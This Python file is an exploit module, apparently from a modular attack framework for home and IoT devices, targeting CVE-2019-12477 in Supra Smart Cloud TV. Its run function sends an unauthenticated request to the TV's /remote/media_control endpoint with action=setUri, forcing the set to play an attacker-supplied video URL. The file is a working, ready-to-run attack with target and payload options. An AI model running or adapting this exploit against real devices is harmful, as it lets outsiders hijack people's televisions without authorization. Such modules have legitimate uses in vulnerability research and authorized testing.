import requests
from modules._module import Module
from utils.custom_print import print_ok, print_error
from utildata.dataset_options import Option


class HomeModule(Module):

    def __init__(self):
        information = {"Name": "CVE-2019-12477",
                       "Description": "Supra Smart Cloud TV allows remote file inclusion in the openLiveURL function, which allows a local attacker to broadcast fake video without any authentication via a /remote/media_control?action=setUri&uri=URI.",
                       "Author": "@josueencinar",
                       "Reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-12477"}

        # -----------name-----default_value--description--required?

        options = {"rhost": Option.create(name="rhost", required=True),
                   "uri": Option.create(name="uri", required=True, description="URL of the video")}

        # Constructor of the parent class
        super(HomeModule, self).__init__(information, options)

    # This function must be always implemented, it is called by the run option
    def run(self):
        url = f"http://{self.args['rhost']}/remote/media_control?action=setUri&uri={self.args['uri']}"
        headers = {
            'Content-Type':'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'     
        }
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print_ok(f"Done!")
        else:
            print_error(f"Response code: {response.status_code}")